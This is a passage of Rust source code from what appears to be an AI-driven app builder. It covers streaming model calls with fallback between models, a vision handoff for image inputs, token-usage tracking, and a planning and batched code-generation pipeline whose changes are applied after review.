            let mut ev = me.bus.start(Some(&info2.project_id), Some(&info2.id), EventKind::Task, EventStatus::Running, info2.title.clone(), json!({ "taskKind": info2.kind }));
            let started = Instant::now();
            let res = f(info2.id.clone(), cancel).await;
            let ms = started.elapsed().as_millis() as u64;
            match res {
                Ok(v) => ev.update(EventStatus::Completed, json!({ "result": v, "durationMs": ms })),
                Err(e) => {
                    let st = if matches!(e, GeniusError::Cancelled) { EventStatus::Cancelled } else { EventStatus::Failed };
                    ev.update(st, json!({ "error": { "kind": e.kind(), "message": e.to_string() }, "durationMs": ms }));
                }
            }
            me.tasks.lock().unwrap().remove(&info2.id);
            me.end_work(&info2.id);
            me.bus.prune(&info2.project_id);
        });
        Ok(info)
    }

    // ===================================================================== AI calls

    /// One model call with live streaming to the UI. When `stream_files` is set, file
    /// blocks are parsed as they arrive and pushed as draft file events (nothing is written).
    pub(crate) async fn ai_call(&self, project_id: &str, task_id: &str, purpose: &str, messages: &[ChatMessage], stream_files: bool, cancel: &CancellationToken) -> Result<(ChatResult, Vec<BlockEvent>)> {
        self.ai_call_opts(project_id, task_id, purpose, messages, stream_files, cancel, &CallOptions { role: Some(ModelRole::Agent), ..Default::default() }).await
    }

    /// [`ai_call`](Self::ai_call) with routing: resolves the model chain for the role, hands
    /// images to a vision model when the chosen model cannot see, and falls back to the next
    /// model when one is unavailable, rate limited, failing, timing out or replies empty.
    /// An empty `task_id` records events without a task and streams nothing to the chat.
    #[allow(clippy::too_many_arguments)]
    pub(crate) async fn ai_call_opts(&self, project_id: &str, task_id: &str, purpose: &str, messages: &[ChatMessage], stream_files: bool, cancel: &CancellationToken, opts: &CallOptions) -> Result<(ChatResult, Vec<BlockEvent>)> {
        let (mut client, s) = self.client()?;
        let role = opts.role.unwrap_or(ModelRole::Agent);
        // Explicit per-call effort, else the effort chosen for this task (plan_work), else settings.
        let effort = opts.effort.or_else(|| self.task_effort(task_id)).unwrap_or(s.effort);
        let request_chars: usize = messages.iter().map(|m| m.content.len()).sum();
        let chain = match (&opts.model, &opts.chain) {
            (Some(m), _) => vec![m.clone()],
            (None, Some(c)) if !c.is_empty() => c.clone(),
            _ => self.resolve_models_for(role, effort, request_chars).await?,
        };
        let manual = (!s.is_auto() && opts.chain.is_none()) || opts.model.is_some();
        let (budget, think) = effort_budget(effort, role, &s);
        let thinking = opts.thinking.unwrap_or(think);
        let level = if !thinking { "low" } else { match effort { Effort::Fast => "low", Effort::Balanced => "medium", Effort::Max => "high" } };
        let chat = ChatOptions {
            temperature: opts.temperature.unwrap_or(s.temperature),
            top_p: 0.95,
            max_tokens: opts.max_tokens.unwrap_or(budget).min(s.max_tokens.saturating_mul(4)).max(256),
            stream: true,
            thinking: Some(thinking),
            reasoning_effort: Some(level.into()),
        };
        if !manual && chain.len() > 1 {
            // Another model is usually faster than waiting out a long rate-limit backoff.
            client.max_retries = client.max_retries.min(1);
        }
        let has_images = messages.iter().any(|m| !m.images.is_empty());
        let mut described: Option<Vec<ChatMessage>> = None;
        let mut last_err: Option<GeniusError> = None;
        for (i, model) in chain.iter().enumerate() {
            let next = chain.get(i + 1);
            if has_images && !self.is_vision_capable(model) && described.is_none() {
                described = Some(self.describe_images(&client, project_id, task_id, messages, effort, cancel).await?);
            }
            let msgs: &[ChatMessage] = match &described {
                Some(d) if has_images && !self.is_vision_capable(model) => d,
                _ => messages,
            };
            let mut res = self.call_model(&client, model, project_id, task_id, purpose, msgs, &chat, stream_files, cancel).await;
            if let Ok((r, _)) = &res {
                if r.finish_reason.as_deref() == Some("length") && r.content.trim().is_empty() && !r.reasoning.trim().is_empty() && chat.thinking != Some(false) {
                    // The model spent its whole budget thinking: ask again without reasoning.
                    self.bus.record(Some(project_id), self.tid(task_id), EventKind::Ai, EventStatus::Completed, format!("{model} used its whole output budget thinking; retrying with thinking off"), json!({ "model": model, "reasoningChars": r.reasoning.len() }));
                    let quick = ChatOptions { thinking: Some(false), reasoning_effort: Some("low".into()), ..chat.clone() };
                    res = self.call_model(&client, model, project_id, task_id, purpose, msgs, &quick, stream_files, cancel).await;
                }
            }
            match res {
                Ok((r, _)) if r.content.trim().is_empty() && !manual && next.is_some() => {
                    self.note_switch(project_id, task_id, model, next, "it returned an empty reply");
                    last_err = Some(GeniusError::Provider(ProviderError::Malformed(format!("{model} returned an empty reply"))));
                }
                Ok((r, events)) => {
                    self.add_usage(task_id, &r);
                    return Ok((r, events));
                }
                Err(e) => {
                    if matches!(e, GeniusError::Provider(ProviderError::ModelUnavailable { .. })) {
                        self.mark_model_failed(model);
                    }
                    match (fallback_reason(&e, manual), next) {
                        (Some(why), Some(_)) => {
                            if manual && i == 0 {
                                // The user's chosen model cannot be used: say so plainly, then continue automatically.
                                self.bus.record(Some(project_id), self.tid(task_id), EventKind::Ai, EventStatus::Completed, format!("Your selected model {model} cannot be used because {why}; continuing with the best available model. Choose another model in Settings → AI provider, or switch to Auto."), json!({ "model": model, "reason": why, "manual": true }));
                            }
                            self.note_switch(project_id, task_id, model, next, &why);
                            last_err = Some(e);
                        }
                        _ => return Err(e),
                    }
                }
            }
        }
        Err(last_err.unwrap_or_else(|| ProviderError::NoModel.into()))
    }

    fn tid<'a>(&self, task_id: &'a str) -> Option<&'a str> {
        (!task_id.is_empty()).then_some(task_id)
    }

    /// Effort [`plan_work`](Self::plan_work) chose for a running task.
    pub(crate) fn task_effort(&self, task_id: &str) -> Option<Effort> {
        if task_id.is_empty() {
            return None;
        }
        self.task_effort.lock().unwrap().get(task_id).copied()
    }

    /// Classify a failed call and remember it in the model stats.
    pub(crate) fn record_provider_error(&self, model: &str, e: &ProviderError, prompt_chars: Option<usize>) {
        if let Some(o) = crate::model_stats::outcome_for_error(e) {
            let limit = match e {
                ProviderError::BadRequest { message, .. } => crate::model_stats::context_limit_from_message(message),
                _ => None,
            };
            self.record_model_observation(model, o, prompt_chars, limit);
        }
    }

    fn note_switch(&self, project_id: &str, task_id: &str, from: &str, to: Option<&String>, why: &str) {
        let to = to.map(String::as_str).unwrap_or("?");
        self.bus.record(Some(project_id), self.tid(task_id), EventKind::Ai, EventStatus::Completed, format!("Switched to {to} because {from} {why}"), json!({ "from": from, "to": to, "reason": why }));
    }

    fn add_usage(&self, task_id: &str, r: &ChatResult) {
        if task_id.is_empty() {
            return;
        }
        let (p, c, t) = r.usage.as_ref().map(usage_tokens).unwrap_or_default();
        let mut all = self.usage.lock().unwrap();
        if all.len() > 500 && !all.contains_key(task_id) {
            all.clear();
        }
        let u = all.entry(task_id.to_string()).or_default();
        u.prompt_tokens += p;
        u.completion_tokens += c;
        u.total_tokens += t;
        u.calls += 1;
        if !r.model.is_empty() && !u.models.contains(&r.model) {
            u.models.push(r.model.clone());
        }
    }

    /// Token totals of a task's AI calls so far: `{ promptTokens, completionTokens, totalTokens, calls, models }`.
    pub fn task_usage(&self, task_id: &str) -> Value {
        serde_json::to_value(self.usage.lock().unwrap().get(task_id).cloned().unwrap_or_default()).unwrap_or(Value::Null)
    }

    /// Token usage of the project's recent AI calls (from the activity log):
    /// `{ promptTokens, completionTokens, totalTokens, calls, byModel: { model: totalTokens } }`.
    pub fn usage_summary(&self, project_id: &str) -> Result<Value> {
        let (mut p, mut c, mut t, mut calls) = (0u64, 0u64, 0u64, 0u64);
        let mut by_model = serde_json::Map::new();
        for e in self.bus.list(Some(project_id), 3000)? {
            if e.kind != EventKind::Ai || e.status != EventStatus::Completed || e.detail.get("purpose").is_none() {
                continue;
            }
            calls += 1;
            let (ep, ec, et) = e.detail.get("usage").map(usage_tokens).unwrap_or_default();
            p += ep;
            c += ec;
            t += et;
            if let Some(m) = e.detail.get("model").and_then(|m| m.as_str()) {
                let prev = by_model.get(m).and_then(|v| v.as_u64()).unwrap_or(0);
                by_model.insert(m.to_string(), json!(prev + et));
            }
        }
        Ok(json!({ "promptTokens": p, "completionTokens": c, "totalTokens": t, "calls": calls, "byModel": by_model }))
    }

    /// Vision handoff: a vision model describes every attached image; the descriptions replace
    /// the images so a text-only model can work from them.
    async fn describe_images(&self, client: &NvidiaClient, project_id: &str, task_id: &str, messages: &[ChatMessage], effort: Effort, cancel: &CancellationToken) -> Result<Vec<ChatMessage>> {
        let chain = self.resolve_models(ModelRole::Vision, effort).await.unwrap_or_default();
        if chain.is_empty() {
            return Err(GeniusError::Validation("An image is attached, but none of the models available to your key can read images. Refresh the model list in Settings → AI provider, or describe the image in words.".into()));
        }
        let opts = ChatOptions { temperature: 0.2, top_p: 0.9, max_tokens: 2048, stream: true, thinking: Some(false), reasoning_effort: Some("low".into()) };
        let mut used = chain[0].clone();
        let mut out: Vec<Vec<String>> = Vec::new();
        let total: usize = messages.iter().map(|m| m.images.len()).sum();
        let mut n = 0;
        for m in messages {
            let mut descs = Vec::new();
            for img in &m.images {
                n += 1;
                let key = {
                    use std::hash::{Hash, Hasher};
                    let mut h = std::collections::hash_map::DefaultHasher::new();
                    img.hash(&mut h);
                    h.finish()
                };
                let cached = self.image_descriptions.lock().unwrap().iter().find(|(k, _, _)| *k == key).map(|(_, m, d)| (m.clone(), d.clone()));
                if let Some((model, d)) = cached {
                    self.bus.record(Some(project_id), self.tid(task_id), EventKind::Ai, EventStatus::Completed, format!("Image {n} of {total} was already described by {model}; reusing that description"), json!({ "model": model, "purpose": "Vision handoff", "cached": true }));
                    used = model;
                    descs.push(d);
                    continue;
                }
                let ask = vec![
                    ChatMessage::system(crate::router::VISION_PROMPT),
                    ChatMessage { role: "user".into(), content: format!("Describe this image in detail. Context from the user's message: {}", m.content.chars().take(600).collect::<String>()), images: vec![img.clone()] },
                ];
                let mut desc = None;
                let mut last_err = None;
                for model in &chain {
                    let mut ev = self.bus.start(Some(project_id), self.tid(task_id), EventKind::Ai, EventStatus::Running, format!("Looking at image {n} of {total} ({model})"), json!({ "model": model, "purpose": "Vision handoff", "images": 1 }));
                    let ev_started = Instant::now();
                    match client.chat(model, &ask, &opts, cancel, |_| {}).await {
                        Ok(r) if !r.content.trim().is_empty() => {
                            ev.update(EventStatus::Completed, json!({ "outputChars": r.content.len(), "usage": r.usage }));
                            self.record_model_outcome(model, crate::model_stats::Outcome::Success { latency_ms: ev_started.elapsed().as_millis() as u64 });
                            used = model.clone();
                            desc = Some(r.content);
                            break;
                        }
                        Ok(_) => ev.update(EventStatus::Failed, json!({ "error": { "kind": "provider_malformed", "message": "empty description" } })),
                        Err(ProviderError::Cancelled) => {
                            ev.update(EventStatus::Cancelled, json!({}));
                            return Err(GeniusError::Cancelled);
                        }
                        Err(e) => {
                            if matches!(e, ProviderError::ModelUnavailable { .. }) {
                                self.mark_model_failed(model);
                            }
                            self.record_provider_error(model, &e, None);
                            ev.update(EventStatus::Failed, json!({ "error": { "kind": e.kind(), "message": e.to_string() } }));
                            last_err = Some(e);
                        }
                    }
                }
                match desc {
                    Some(d) => {
                        let mut cache = self.image_descriptions.lock().unwrap();
                        if cache.len() >= 24 {
                            cache.remove(0);
                        }
                        cache.push((key, used.clone(), d.clone()));
                        descs.push(d);
                    }
                    None => return Err(last_err.map(GeniusError::from).unwrap_or_else(|| GeniusError::Validation("No vision model could describe the attached image.".into()))),
                }
            }
            out.push(descs);
        }
        Ok(crate::router::replace_images_with_descriptions(messages, &out, &used))
    }

    /// One streamed request to one model, recorded as an AI activity event.
    #[allow(clippy::too_many_arguments)]
    async fn call_model(&self, client: &NvidiaClient, model: &str, project_id: &str, task_id: &str, purpose: &str, messages: &[ChatMessage], opts: &ChatOptions, stream_files: bool, cancel: &CancellationToken) -> Result<(ChatResult, Vec<BlockEvent>)> {
        let prompt_chars: usize = messages.iter().map(|m| m.content.len()).sum();
        let live = !task_id.is_empty();
        let mut ev = self.bus.start(Some(project_id), self.tid(task_id), EventKind::Ai, EventStatus::Running, format!("{purpose} ({model})"), json!({ "model": model, "purpose": purpose, "promptChars": prompt_chars, "maxTokens": opts.max_tokens, "thinking": opts.thinking }));
        let mut parser = BlockParser::default();
        let mut events: Vec<BlockEvent> = Vec::new();
        let (mut buf, mut tbuf) = (String::new(), String::new());
        let (mut last_flush, mut last_tflush) = (Instant::now(), Instant::now());
        let bus = self.bus.clone();
        let (pid, tid) = (project_id.to_string(), task_id.to_string());
        // Time to the first token (content or reasoning): the latency the router learns from.
        let started = Instant::now();
        let first_token = std::sync::atomic::AtomicU64::new(0); // 0: no token yet
        let mark_first = || {
            use std::sync::atomic::Ordering::Relaxed;
            if first_token.load(Relaxed) == 0 {
                first_token.store((started.elapsed().as_millis() as u64).max(1), Relaxed);
            }
        };
        let push_file = |bus: &EventBus, e: &BlockEvent| {
            let mut v = serde_json::to_value(e).unwrap_or(Value::Null);
            v["taskId"] = json!(tid);
            v["projectId"] = json!(pid);
            bus.push(channels::FILE_STREAM, v);
        };
        let res = client
            .chat_with_reasoning(
                model,
                messages,
                opts,
                cancel,
                |delta| {
                    mark_first();
                    buf.push_str(delta);
                    if live && (buf.len() > 256 || last_flush.elapsed() > Duration::from_millis(60)) {
                        bus.push(channels::AI_DELTA, json!({ "taskId": tid, "projectId": pid, "text": std::mem::take(&mut buf) }));
                        last_flush = Instant::now();
                    }
                    if stream_files {
                        for e in parser.push(delta) {
                            push_file(&bus, &e);
                            events.push(e);
                        }
                    }
                },
                |thought| {
                    mark_first();
                    tbuf.push_str(thought);
                    if live && (tbuf.len() > 256 || last_tflush.elapsed() > Duration::from_millis(80)) {
                        bus.push(channels::AI_THINKING, json!({ "taskId": tid, "projectId": pid, "text": std::mem::take(&mut tbuf) }));
                        last_tflush = Instant::now();
                    }
                },
            )
            .await;
        if live && !buf.is_empty() {
            bus.push(channels::AI_DELTA, json!({ "taskId": tid, "projectId": pid, "text": buf }));
        }
        if live && !tbuf.is_empty() {
            bus.push(channels::AI_THINKING, json!({ "taskId": tid, "projectId": pid, "text": tbuf }));
        }
        match res {
            Ok(r) => {
                if stream_files {
                    // a normal finish means a file left open only lacks its END line; a cut-off answer stays incomplete
                    let tail = if r.finish_reason.as_deref() == Some("stop") { parser.finish_closing() } else { parser.finish() };
                    for e in tail {
                        push_file(&bus, &e);
                        events.push(e);
                    }
                } else {
                    events = crate::blocks::parse_all_ex(&r.content, r.finish_reason.as_deref() == Some("stop"));
                }
                let tokens = r.usage.as_ref().map(usage_tokens).map(|(p, c, t)| json!({ "prompt": p, "completion": c, "total": t }));
                if r.content.trim().is_empty() && r.reasoning.trim().is_empty() {
                    self.record_model_observation(model, crate::model_stats::Outcome::Failed, Some(prompt_chars), None);
                } else {
                    let latency_ms = match first_token.load(std::sync::atomic::Ordering::Relaxed) {
                        0 => started.elapsed().as_millis() as u64,
                        t => t,
                    };
                    self.record_model_observation(model, crate::model_stats::Outcome::Success { latency_ms }, Some(prompt_chars), None);
                }
                ev.update(EventStatus::Completed, json!({ "finishReason": r.finish_reason, "outputChars": r.content.len(), "streamed": r.streamed, "usage": r.usage, "tokens": tokens, "reasoningChars": r.reasoning.chars().count(), "reasoningHidden": r.had_reasoning, "requestedModel": r.model, "reportedModel": r.reported_model, "firstTokenMs": r.first_token_ms, "totalMs": r.total_ms, "images": messages.iter().map(|m| m.images.len()).sum::<usize>() }));
                Ok((r, events))
            }
            Err(e) => {
                self.record_provider_error(model, &e, Some(prompt_chars));
                let e = GeniusError::from(e);
                ev.update(if matches!(e, GeniusError::Cancelled) { EventStatus::Cancelled } else { EventStatus::Failed }, json!({ "error": { "kind": e.kind(), "message": e.to_string() } }));
                Err(e)
            }
        }
    }

    // ===================================================================== plan

    pub fn start_plan(self: &Arc<Self>, project_id: &str, description: &str, constraints: &str) -> Result<TaskInfo> {
        if description.trim().len() < 10 {
            return Err(GeniusError::Validation("Describe the application in at least a sentence.".into()));
        }
        self.client()?; // fail fast on an invalid base URL
        self.has_usable_model()?;
        let me = self.clone();
        let (pid, d, c) = (project_id.to_string(), description.to_string(), constraints.to_string());
        self.db.rename_project(project_id, &self.db.get_project(project_id)?.name, description)?;
        self.spawn_task(project_id, "plan", "Plan the application", move |tid, cancel| async move {
            let spec = me.plan(&pid, &tid, &d, &c, &cancel).await?;
            Ok(json!({ "spec": spec }))
        })
    }

    pub async fn plan(&self, project_id: &str, task_id: &str, description: &str, constraints: &str, cancel: &CancellationToken) -> Result<ProjectSpec> {
        self.db.add_message(project_id, Some(task_id), "user", &format!("{description}{}", if constraints.trim().is_empty() { String::new() } else { format!("\n\nConstraints: {constraints}") }))?;
        let mut messages = prompts::plan_messages(description, constraints);
        let mut ev = self.bus.start(Some(project_id), Some(task_id), EventKind::Plan, EventStatus::Running, "Analyzing request and preparing the implementation plan", json!({}));
        let mut last_err = None;
        for attempt in 0..2 {
            let (r, _) = match self.ai_call_opts(project_id, task_id, if attempt == 0 { "Planning" } else { "Re-requesting plan as valid JSON" }, &messages, false, cancel, &CallOptions::role(ModelRole::Plan)).await {
                Ok(x) => x,
                Err(e) => {
                    ev.update(EventStatus::Failed, json!({ "error": { "kind": e.kind(), "message": e.to_string() } }));
                    return Err(e);
                }
            };
            match spec::parse_spec(&r.content) {
                Ok(s) => {
                    self.db.update_project_spec(project_id, &serde_json::to_value(&s)?)?;
                    self.db.patch_project_status(project_id, &json!({ "stage": "planned" }))?;
                    let p = self.db.get_project(project_id)?;
                    if p.notes.trim().is_empty() {
                        let mut notes = String::from("## Architecture\n");
                        notes.push_str(&s.architecture);
                        if !s.assumptions.is_empty() {
                            notes.push_str("\n\n## Decisions & assumptions\n");
                            for a in &s.assumptions {
                                notes.push_str(&format!("- {a}\n"));
                            }
                        }
                        self.db.update_project_notes(project_id, &notes)?;
                    }
                    self.db.add_message(project_id, Some(task_id), "assistant", &spec::to_markdown(&s))?;
                    ev.update(EventStatus::Completed, json!({ "features": s.features.len(), "files": s.files.len(), "attempts": attempt + 1 }));
                    return Ok(s);
                }
                Err(e) => {
                    messages.push(ChatMessage::assistant(r.content.chars().take(4000).collect::<String>()));
                    messages.push(prompts::plan_repair_message(&e.to_string()));
                    last_err = Some(e);
                }
            }
        }
        let e = last_err.unwrap_or_else(|| GeniusError::Internal("planning failed".into()));
        let e = GeniusError::Validation(format!("{e} The selected model may not follow structured-output instructions well; try a larger instruction-tuned model."));
        ev.update(EventStatus::Failed, json!({ "error": { "kind": e.kind(), "message": e.to_string() } }));
        Err(e)
    }

    pub fn update_spec(&self, project_id: &str, spec: &ProjectSpec) -> Result<ProjectRow> {
        spec::validate(spec)?;
        self.db.update_project_spec(project_id, &serde_json::to_value(spec)?)?;
        self.bus.record(Some(project_id), None, EventKind::Plan, EventStatus::Completed, "Plan edited", json!({}));
        self.db.get_project(project_id)
    }

    // ===================================================================== generate

    pub fn start_generate(self: &Arc<Self>, project_id: &str) -> Result<TaskInfo> {
        let p = self.db.get_project(project_id)?;
        if p.spec.is_none() {
            return Err(GeniusError::Validation("Create and review a plan before generating code.".into()));
        }
        let me = self.clone();
        let pid = project_id.to_string();
        self.spawn_task(project_id, "generate", "Generate the application", move |tid, cancel| async move { me.generate(&pid, &tid, &cancel).await })
    }

    pub async fn generate(&self, project_id: &str, task_id: &str, cancel: &CancellationToken) -> Result<Value> {
        let p = self.db.get_project(project_id)?;
        let spec: ProjectSpec = serde_json::from_value(p.spec.clone().ok_or_else(|| GeniusError::Validation("no plan".into()))?)?;
        let ws = self.workspace(project_id)?;
        let store = ChangeStore::new(&self.db);
        let fresh = !ws.exists("package.json");
        // A project that still holds only Genius's own starter page has no user work to protect,
        // so the first real application is applied directly (and stays revertible). Without this a
        // second attempt on a half-finished project only *proposed* the files while the preview
        // kept showing the starter page.
        let blank = fresh || self.starter_only(&ws);
        let mut phases: Vec<Value> = Vec::new();
        let mut stage = |name: &str, status: &str, note: String| {
            phases.push(json!({ "stage": name, "status": status, "note": note }));
            self.bus.record(Some(project_id), Some(task_id), EventKind::Task, if status == "failed" { EventStatus::Failed } else { EventStatus::Completed }, format!("{}: {note}", stage_label(name)), json!({ "stage": name, "stageStatus": status }));
        };

        // 1. Deterministic template (only for an empty project).
        if fresh {
            let files = scaffold::files(&p.name, &spec.purpose);
            let changes = compute_changes(&ws, &files, &[])?;
            let cs = store.create(project_id, Some(task_id), "template", "Project template (Vite + React + TypeScript)", "Created by Genius from its built-in template", &changes)?;
            self.apply_changeset_inner(project_id, Some(task_id), &cs.id)?;
        }

        // 2. Ask the model for the implementation, streaming files live.
        let mut template_ctx = String::from("CURRENT TEMPLATE FILES:\n");
        for f in ["package.json", "src/main.tsx", "vite.config.ts", "tsconfig.json"] {
            if let Some(c) = ws.read_text_opt(f)? {
                template_ctx.push_str(&format!("<<<CURRENT: {f}>>>\n{c}<<<END CURRENT>>>\n"));
            }
        }
        let mut messages = prompts::generate_messages(&spec, &template_ctx, &p.notes);
        let mut all_events = Vec::new();
        let mut explanation = String::new();
        let mut last_progress = (usize::MAX, usize::MAX);
        let mut stalled = 0;
        let mut rounds = 0;
        // A plan with more than a handful of files is written a few files at a time, dependencies first, then
        // gaps are closed the same way. (One answer holding a whole app is cut off by the output limit.)
        let batched = spec.files.len() > prompts::GENERATE_BATCH_FILES;
        // Writing known files from a finished plan needs no long hidden reasoning: without it each part takes
        // seconds instead of minutes (the reasoning budget is what made one real run last 15+ minutes).
        let batch_opts = CallOptions { role: Some(ModelRole::Code), thinking: Some(false), effort: Some(Effort::Balanced), max_tokens: Some(24_000), ..Default::default() };
        if batched {
            let order = prompts::generation_order(&spec.files);
            // Foundations (styles, types, helpers, hooks, context) are written first, in order, because everything imports
            // them. The rest (components, pages, App) only needs what exists by then, so up to MAX_PARALLEL batches of it are
            // written at the same time: about three times faster on a slow model.
            const MAX_PARALLEL: usize = 3;
            let (foundation, rest): (Vec<_>, Vec<_>) = order.into_iter().partition(|f| prompts::generation_tier(&f.path) <= 2);
            let mut waves: Vec<Vec<Vec<crate::spec::PlannedFile>>> = Vec::new();
            for chunk in foundation.chunks(prompts::GENERATE_BATCH_FILES) {
                waves.push(vec![chunk.to_vec()]);
            }
            for group in rest.chunks(prompts::GENERATE_BATCH_FILES * MAX_PARALLEL) {
                waves.push(group.chunks(prompts::GENERATE_BATCH_FILES).map(|c| c.to_vec()).collect());
            }
            let parts: usize = waves.iter().map(|w| w.len()).sum();
            let mut done_parts = 0usize;
            let bo = &batch_opts;
            for wave in waves {
                let written = collect(&all_events).files;
                let note = if wave.len() > 1 { "Other files of this application are being written at the same moment by another worker (see the file list in the specification). Import them by their planned path; every component or page file default-exports a component named exactly like its file. Do not write those other files yourself." } else { "" };
                let calls = wave.iter().enumerate().map(|(k, batch)| {
                    let msgs = prompts::generate_batch_messages(&spec, &template_ctx, &p.notes, &written, batch, done_parts + k, parts, note);
                    let purpose = format!("Generating source code (part {}/{parts})", done_parts + k + 1);
                    async move { self.ai_call_opts(project_id, task_id, &purpose, &msgs, true, cancel, bo).await }
                });
                let results = futures_util::future::join_all(calls).await;
                for r in results {
                    let (_, ev) = r?;
                    rounds += 1;
                    if done_parts == 0 && explanation.is_empty() {
                        explanation = collect(&ev).explanation;
                    }
                    all_events.extend(ev);
                }
                // files that arrived cut off or not at all are asked for again, alone and compact
                let missing: Vec<crate::spec::PlannedFile> = {
                    let parsed = collect(&all_events);
                    wave.iter().flatten().filter(|f| !parsed.files.iter().any(|(p, _)| p == &f.path)).cloned().collect()
                };
                if !missing.is_empty() {
                    stage("generate", "continuing", format!("{} file(s) were cut off; writing them again one at a time", missing.len()));
                    for f in missing {
                        let written = collect(&all_events).files;
                        let note = format!("A previous attempt at {} was cut off by the output limit. Write it again COMPLETE and compact: under 200 lines, no long comments, no unused code.", f.path);
                        let msgs = prompts::generate_batch_messages(&spec, &template_ctx, &p.notes, &written, std::slice::from_ref(&f), done_parts, parts, &note);
                        let (_, ev) = self.ai_call_opts(project_id, task_id, &format!("Rewriting {}", f.path), &msgs, true, cancel, &batch_opts).await?;
                        rounds += 1;
                        all_events.extend(ev);
                    }
                }
                done_parts += wave.len();
            }
            // close what is still missing: App.tsx, cut-off files, imports of files nobody wrote
            for gap_round in 0..3 {
                let parsed = collect(&all_events);
                let gaps = self.generation_gaps(&ws, &parsed, blank);
                if gaps.is_complete() {
                    break;
                }
                let mut want: Vec<crate::spec::PlannedFile> = gaps.must_write.iter().map(|p| crate::spec::PlannedFile { path: p.clone(), purpose: "required by the application".into() }).collect();
                for u in crate::integrity::unresolved_relative_imports(&parsed.files, &|p| ws.exists(p)) {
                    let dir = u.importer.rsplit_once('/').map(|(d, _)| d).unwrap_or("");
                    let mut parts_: Vec<&str> = dir.split('/').filter(|s| !s.is_empty()).collect();
                    for seg in u.specifier.split('/') {
                        match seg {
                            "." | "" => {}
                            ".." => {
                                parts_.pop();
                            }
                            s => parts_.push(s),
                        }
                    }
                    let mut path = parts_.join("/");
                    let last = path.rsplit('/').next().unwrap_or("").to_string();
                    if !last.contains('.') {
                        path.push_str(if last.chars().next().is_some_and(|c| c.is_uppercase()) { ".tsx" } else { ".ts" });
                    }
                    if !want.iter().any(|f| f.path == path) {
                        want.push(crate::spec::PlannedFile { path: path.clone(), purpose: format!("imported by {} but missing", u.importer) });
                    }
                }
                want.truncate(prompts::GENERATE_BATCH_FILES);
                if want.is_empty() {
                    break;
                }
                stage("generate", "continuing", format!("gap round {}: writing {} missing file(s)", gap_round + 1, want.len()));
                let note = format!("Problems found so far:
{}", gaps.notes.join("
"));
                let msgs = prompts::generate_batch_messages(&spec, &template_ctx, &p.notes, &parsed.files, &want, 0, 1, &note);
                let (_, ev) = self.ai_call_opts(project_id, task_id, "Completing the project", &msgs, true, cancel, &batch_opts).await?;
                rounds += 1;
                all_events.extend(ev);
            }
        }
        for round in 0..(if batched { 0 } else { GENERATE_ROUNDS }) {
            rounds = round + 1;
            let purpose = if round == 0 { "Generating source code" } else { "Completing the project" };
            let (r, events) = self.ai_call_opts(project_id, task_id, purpose, &messages, true, cancel, &CallOptions::role(ModelRole::Code)).await?;
            all_events.extend(events);
            if round == 0 {
                explanation = collect(&all_events).explanation;
            }
            // Stop only when the model is finished AND the output hangs together. Running out of
            // output budget is not the only way to stop early: a model can also simply forget the
            // file that wires the others together.
            let parsed = collect(&all_events);
            let gaps = self.generation_gaps(&ws, &parsed, blank);
            let cut_off = r.finish_reason.as_deref() == Some("length");
            if !cut_off && gaps.is_complete() {
                break;
            }
            if round + 1 == GENERATE_ROUNDS {
                break;
            }
            let progress = (parsed.files.len(), gaps.must_write.len() + gaps.notes.len());
            stalled = if progress == last_progress { stalled + 1 } else { 0 };
            if stalled >= 2 {
                break; // the model keeps returning the same thing: do not spend more of the user's quota
            }
            last_progress = progress;
            stage("generate", "continuing", format!("round {} left {} gap(s); asking the model for the rest", round + 1, gaps.must_write.len() + gaps.notes.len()));
            let done: Vec<String> = parsed.files.iter().map(|(p, _)| p.clone()).collect();
            messages.push(ChatMessage::assistant(r.content));
            messages.push(prompts::completion_message(&done, &gaps.must_write, &gaps.notes, cut_off));
        }
        let parsed = collect(&all_events);
        let incomplete: Vec<String> = parsed.incomplete.iter().filter(|p| !parsed.files.iter().any(|(f, _)| f == *p)).cloned().collect();
        if parsed.files.is_empty() {
            return Err(GeniusError::Validation(
                "The model did not return any files in the required format. Try again or choose a stronger code model in Settings.".into(),
            ));
        }
        let gaps = self.generation_gaps(&ws, &parsed, blank);
        stage("generate", if gaps.is_complete() { "done" } else { "incomplete" }, format!("{} files written in {rounds} model round(s){}", parsed.files.len(), if gaps.is_complete() { String::new() } else { format!("; still missing: {}", gaps.summary()) }));
        let (changes, rejected) = self.safe_changes(&ws, &parsed.files, &parsed.deletes)?;
        let summary = if explanation.is_empty() { format!("Generated {} files", changes.len()) } else { explanation.clone() };
        let cs = store.create(project_id, Some(task_id), "generate", &format!("Generate {}", spec.name), &summary, &changes)?;
        self.db.add_message(project_id, Some(task_id), "assistant", &format!("{summary}\n\nFiles: {}", changes.iter().map(|c| c.path.as_str()).collect::<Vec<_>>().join(", ")))?;

        // 3. Apply. A blank project only contains the starter, so applying cannot destroy user
        //    work; every file remains revertible from History. Re-generation of a project with
        //    real code follows the review policy, and says so plainly.
        let auto = blank || self.settings()?.approvals.apply_ai_edits == Policy::Auto;
        if !auto {
            stage("apply", "awaiting_review", format!("{} file(s) are drafts; nothing is written to the project until you apply them", changes.len()));
            self.db.patch_project_status(project_id, &json!({ "pendingChangeset": cs.id, "generation": { "state": "awaiting_review", "at": now() } }))?;
            self.bus.record(Some(project_id), Some(task_id), EventKind::Changeset, EventStatus::AwaitingApproval, format!("Review proposed changes: {}", cs.title), json!({ "changesetId": cs.id }));
            return Ok(json!({ "state": "awaiting_review", "changesetId": cs.id, "applied": false, "rejectedPaths": rejected, "incomplete": incomplete, "gaps": gaps.json(), "phases": phases }));
        }
        self.apply_changeset_inner(project_id, Some(task_id), &cs.id)?;
        stage("apply", "done", format!("{} file(s) written to the project folder", changes.len()));

        // A project whose src/App.tsx is still the starter page is not generated, whatever else
        // was written: building it would only prove that the template compiles.
        let app_src = ws.read_text_opt("src/App.tsx")?;
        if blank && app_src.as_deref().is_none_or(scaffold::is_template_app) {
            let msg = format!(
                "Genius wrote {} file(s), but src/App.tsx is still the starter page, so the application is NOT generated and the preview would only show the template. {}Choose Regenerate, or ask the Assistant to write src/App.tsx.",
                changes.len(),
                if gaps.is_complete() { String::new() } else { format!("Missing: {}. ", gaps.summary()) }
            );
            stage("verify", "failed", msg.clone());
            self.db.patch_project_status(project_id, &json!({ "stage": "generation_incomplete", "pendingChangeset": null, "generation": { "state": "incomplete", "at": now() } }))?;
            return Err(GeniusError::Validation(msg));
        }
        self.db.patch_project_status(project_id, &json!({ "stage": "generated", "pendingChangeset": null }))?;

        // 4. Verify for real: install → build → preview (+ Build Doctor on failure).
        let verify = self.verify_pipeline_opts(project_id, task_id, cancel, true, blank).await;
        let verify = match verify {
            Ok(v) => v,
